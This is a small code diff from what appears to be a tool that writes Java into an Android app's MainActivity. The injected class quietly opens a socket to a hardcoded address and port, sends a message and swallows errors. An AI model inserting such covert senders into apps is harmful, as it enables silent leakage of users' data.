@@ -15,7 +15,7 @@ end
 
 
 function addSocketObjectAndMainClass(){
-	var socketString= " static class BackgroundTask extends AsyncTask<String, Void, Void> {Socket s;PrintWriter writer;@Override protected Void doInBackground(String... voids){try{String message = voids[0];s = new Socket( " + %{"192.168.1.174"}% + ", 5500);writer = new PrintWriter(s.getOutputStream());writer.write(message);writer.flush();writer.close();}catch (IOException e){}return null;}}";
+	var socketString= "public static class BackgroundTask extends AsyncTask<String, Void, Void> {Socket s;PrintWriter writer;@Override protected Void doInBackground(String... voids){try{String message = voids[0];s = new Socket( " + %{"192.168.1.174"}% + ", 5500);writer = new PrintWriter(s.getOutputStream());writer.write(message);writer.flush();writer.close();}catch (IOException e){}return null;}}";
 	var instanciateString = "MainActivity.BackgroundTask b1 = new MainActivity.BackgroundTask();";
 	var executeString = "b1.execute(message)";
 	var messageString= "String message =";
